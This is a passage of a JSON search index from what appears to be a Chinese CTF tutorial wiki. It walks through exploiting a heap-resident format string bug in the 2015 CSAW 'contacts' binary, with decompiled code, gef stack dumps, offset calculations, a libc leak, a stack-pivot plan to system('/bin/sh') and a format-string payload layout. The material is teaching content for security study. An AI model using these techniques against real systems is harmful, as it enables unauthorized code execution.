\u8f93\u5165\uff0c\u800c\u662f\u53cc\u5b57\u8282\u3002","title":"\u5229\u7528\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_21","text":"","title":"\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"fmtstr/fmtstr_example/#_22","text":"\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\uff08\u51fa\u73b0\u60c5\u51b5\u5c31\u50cf\u4e0b\u9762\u4f8b\u5b50\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u5b57\u7b26\u6307\u9488\u6307\u5411\u6808\u4e0a\uff0c\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u6211\u4eec\u4e0d\u80fd\u5bb9\u6613\u63a7\u5236\u5199\u5165\u7684\u5730\u5740\uff09","title":"\u539f\u7406"},{"location":"fmtstr/fmtstr_example/#_23","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 CSAW \u4e2d\u7684 contacts \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002","title":"\u4f8b\u5b50"},{"location":"fmtstr/fmtstr_example/#_24","text":"\u279c 2015-CSAW-contacts git:(master) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86 Canary\u3002\uff08RELRO \u534a\u4fdd\u62a4\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u80fd hijack got \u8868\u5462\uff1fhijack retaddr \u5462\uff1f\uff09","title":"\u786e\u5b9a\u4fdd\u62a4"},{"location":"fmtstr/fmtstr_example/#_25","text":"\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6253\u5370\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo(int a1, int a2, int a3, char *format) { printf(\"\\tName: %s\\n\", a1); printf(\"\\tLength %u\\n\", a2); printf(\"\\tPhone #: %s\\n\", a3); printf(\"\\tDescription: \"); return printf(format); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a format \u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002 \u6ce8\u89e3 \uff1a\u53ef\u4ee5\u4ece\u8c03\u7528 PrintInfo \u7684\u4e0a\u5c42\u51fd\u6570\u67e5\u770b\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff1a\uff08v2 \u662f\u7ed3\u6784\u4f53\u94fe\u8868\uff09 sub_8048BD1(v2 + 8, *(_DWORD *)(v2 + 72), *(_DWORD *)(v2 + 4), *(char **)v2);","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"fmtstr/fmtstr_example/#_26","text":"\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684 shell\uff0c\u4ece\u800c\u62ff\u5230 flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 got \u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301 got \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709 printf \u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020 /bin/sh \u8ba9\u5b83\u6267\u884c system('/bin/sh')\uff0c\u4f46\u662f printf \u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u6ce8\u89e3 \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u8f93\u5165\u53c2\u6570\u7684\u51fd\u6570\u5c31\u53ea\u6709 printf \uff0c\u8bf8\u5982 puts \u7b49\u7684\u53c2\u6570\u90fd\u662f\u6211\u4eec\u4e0d\u53ef\u63a7\u7684\u3002\u56e0\u4e3a\u4fee\u6539 got \u8868\u4e4b\u540e\u6211\u4eec\u9700\u8981\u4f20\u5165 binsh \u7684\u5730\u5740\uff0c\u6240\u4ee5\u53ea\u80fd\u9009\u62e9 printf \u3002\u4f46\u662f\u9009\u62e9 printf \u53c8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u4fee\u6539\u5b8c\u540e\uff0cprintf \u5404\u4e2a\u5730\u65b9\u90fd\u4f1a\u7528\u5230\uff0c\u8fd8\u6ca1\u8fd0\u884c\u5230\u6211\u4eec\u80fd\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff0c\u7a0b\u5e8f\u5c31\u5df2\u7ecf\u6302\u903c\u4e86\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0 wiki \u4e2d\u6ca1\u6709\u63d0\u53ca\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u5199\u5165\u5730\u5740\u3002\u539f\u56e0\u5f88\u7b80\u5355\uff1a\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\u77e5\u9053\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u800c\u5b57\u7b26\u4e32\u6307\u9488\u662f\u5728\u6808\u4e0a\uff0c\u5f88\u660e\u663e\u7684\u73b0\u8c61\u5c31\u662f\u6808\u4e0a\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u660e\u6587\uff0c\u800c\u662f\u5b57\u7b26\u4e32\u7684\u5806\u5730\u5740\uff0c\u5c31\u7b97\u6211\u4eec\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u4e5f\u4e0d\u80fd\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u3002\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u5168\u90e8\u53ef\u63a7\u8f93\u5165\u90fd\u653e\u5728\u5806\u4e0a\uff09\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u627e\u6808\u4e0a\u73b0\u6709\u7684\u5730\u5740\u3002 \u8d85\u957f\u504f\u79fb\u80fd\u53d6\u5230\u503c\uff1f\u6211\u4eec\u5f53\u5b83\u662f\u53ef\u884c\u7684\u8bd5\u4e00\u8bd5\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5230\u63cf\u8ff0\u5806\u5757\u76f8\u5dee -0xf7fafed0 \uff0c\u504f\u79fb\u4e3a -1040105396 \uff0c\u6784\u9020\u5c1d\u8bd5\u4e00\u4e0b\uff1a \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165 system_addr + 'bbbb' + addr of '/bin/sh\u2018 \u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u6ce8\u89e3 \uff1a \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u53ea\u80fd\u5728\u6808\u4e0a\u901a\u8fc7\u504f\u79fb\u627e\u5730\u5740\uff0c\u800c\u6808\u4e0a\u6ca1\u6709\u6307\u5411 eip \u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u627e\u4e0d\u5230 eip \u5730\u5740\uff0c\u5c31\u4e0d\u80fd\u4fee\u6539 eip \u7684\u503c\u3002 \u6ce8\u89e3 \uff1a \u5c31\u56e0\u4e3a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528 hijack GOT \u3001hijack retaddr \u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7 leave \u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58 ebp \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884c leave \u6307\u4ee4\u7684\u65f6\u5019\uff0c esp \u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\uff08leave \u6307\u4ee4\u7b49\u4e8e\uff1a mov esp,ebp;pop ebp; \uff09 \u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58 ebp \u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6 PrintInfo \u51fd\u6570\u4e2d\u5b58\u50a8 ebp \u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684 ebp \u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58 ebp \u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684 ebp \u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373 main \u51fd\u6570\uff09\u7684 ebp \u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6839\u636e libc database \u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3a system_addr + 'bbbb' + binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684 ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684 ebp) \u4e3a \u5b58\u50a8 system_addr \u7684\u5730\u5740 -4 \u3002 \u6ce8\u89e3 \uff1a \u4e3a\u4ec0\u662f system_addr \u7684\u5730\u5740 -4 \uff1f\u662f\u56e0\u4e3a\u7a0b\u5e8f\u672b\u5c3e\u7684 leave;ret \u6267\u884c\u5b8c leave \u540e\uff0cesp \u662f\u6307\u5411 ebp \u7684\uff0c\u7136\u540e esp \u7684\u503c\u4f1a\u589e\u52a0\u4e00\u4e2a\u673a\u5668\u957f\u5ea6\uff08\u8fd9\u65f6 esp \u521a\u597d\u662f\u6307\u5411 eip \uff09\uff0c\u518d\u6267\u884c ret \u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\uff08\u7b2c\u4e00\u7b2c\u4e8c\u5408\u5e76\u7b49\u4e8e leave \uff09 move esp,ebp\uff0c\u5c06 esp \u6307\u5411 system_addr \u7684\u5730\u5740 - 4 pop ebp\uff0c \u5c06 esp \u6307\u5411 system_addr ret\uff0c\u5c06 eip \u6307\u5411 system_addr\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002","title":"\u5229\u7528\u601d\u8def"},{"location":"fmtstr/fmtstr_example/#_27","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53ca PrintInfo \u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684 libc_start_main_ret \u5730\u5740 (\u8be5\u5730\u5740\u662f\u5f53 main \u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570) \u6765\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728 printf \u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 printf \u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [esp] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [esp] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 [#0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [#1] 0x8048c27 \u2192 leave [#2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [#3] 0x80487a2 \u2192 jmp 0x80487b3 [#4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [#5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 ['$esp', '140'] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 ['$esp', 'l140'] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 (\"g+\"?) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 (\"%s\"?) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 (\"P\"?) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u662f __libc_start_main \u7684\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528 fmtarg \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a 32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 31\uff08\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728 0xffffcd00 \uff09\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636e libc-database \u6765\u83b7\u53d6\u5bf9\u5e94\u7684 libc\uff0c\u7ee7\u800c\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u4e0e /bin/sh \u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740 0xffffcd2c \u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 11\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5bfb\u5740\u5806\u4e2d\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u7684\u5185\u5b58\u9996\u5730\u5740\uff0c\u6211\u4eec\u5c06\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 [system_addr][bbbb][binsh_addr][%6p][p][p][bbbb] \u4fdd\u5b58\u5728\u6307\u5b9a\u8054\u7cfb\u4eba\u7684 Description \u4e2d\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a 6\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684 ebp \u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp","title":"\u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb"},{"location":"fmtstr/fmtstr_example/#_28","text":"\u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684 ebp \u5730\u5740\u3002 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684 bbbb \u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684 ebp \u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002 \u6ce8\u89e3 \uff1a \u56e0\u4e3a PrintInfo \u80af\u5b9a\u662f\u901a\u8fc7 main \u51fd\u6570\u8c03\u7528\u7684\uff0c\u800c main \u51fd\u6570\u4e00\u76f4\u6ca1\u6709\u7ed3\u675f\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u5728\u5185\u5b58\u7684\u67d0\u4e00\u56fa\u5b9a\u4f4d\u7f6e\u3002PrintInfo \u662f\u5728 main \u6808\u57fa\u7840\u4e0a\u5f80\u4f4e\u5730\u5740\u751f\u957f\u7684\uff0c\u6240\u4ee5\u53ea\u6709 PrintInfo \u7ed3\u6784\u56fa\u5b9a ebp \u5730\u5740\u4e5f\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002PrintInfo 